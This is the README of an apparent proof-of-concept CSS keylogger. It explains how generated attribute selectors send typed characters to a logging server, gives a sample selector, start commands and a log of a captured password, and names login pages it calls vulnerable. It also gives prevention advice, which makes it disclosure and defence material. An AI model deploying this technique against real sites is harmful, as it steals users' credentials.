# CSS Keylogger

Inspired by: https://news.ycombinator.com/item?id=16422696

This is a proof-of-concept keylogger that uses entirely CSS to log the values of inputs on websites that modify the input's `value` attribute.

React and other frameworks may sync the input value with the DOM input attribute, which allows this trick to work. **Otherwise the website is not vulnerable**

For example, the login pages of Pinterest and Instagram are vulnerable. (Inspect the login fields and see how the actual username and password are visible in the DOM)

### How does it work?

The CSS is dynamically generated by the server and generates CSS selectors for input fields ending in every combination of two characters in a reasonable ASCII range.

When a user types into an input field, the CSS selectors will request images from a server, which are then logged. My version also logs when the fields are focused as well as the users IP, so multiple fields and users can be logged.

Example: `input[value$="AB"] { background-image: url("http://localhost:3000/log/AB") }`

### Limitations

- Does not work for certain repeating combinations.
    - The original inspiration for this used CSS selectors for single characters, so only the first instance of a character was logged. My example uses two characters per selector so it can handle strings such as "lol" which include two of the same character, but not repeating strings such as "lolol" (the last "ol" won't be logged).
    - By using three characters per selector it would be possible to log even more combinations, however this results in a huge (80+ MB) file, where the two character version is just under 1MB.
    - Cache-Control headers will _not_ make the browser send multiple requests for the same background image, however they will prevent caching when the page is reloaded.
- Does not account for mouse clicks, copy/pasting, backspaces, arrow keys, etc.
- May not log in the correct order. (I have not tested this but I suppose it could happen when typing fast on a mobile network)

### Prevention

A CSS file like this could be inserted into your website by a malicious package during your build process, or by a user if you allow user-uploaded custom stylesheets.

- If you are using React, use uncontrolled components or remove the value binding.
- The best method is a CSP (Content Security Policy) to only allow scripts, css, images, AJAX requests, etc. to be loaded from trusted sources such as your own domain.

### How to Use

```
yarn install
yarn start
```

Go to http://localhost:3000/

### Example

[Click to Watch Gif](https://giant.gfycat.com/ColorlessConsciousAmethystinepython.webm)

```
CSS keylogger server listening on port 3000!
[::1] field: username
[::1] te
[::1] tes
[::1] test
[::1] field: password
[::1] hu
[::1] hun
[::1] hunt
[::1] hunter
[::1] hunter2
```
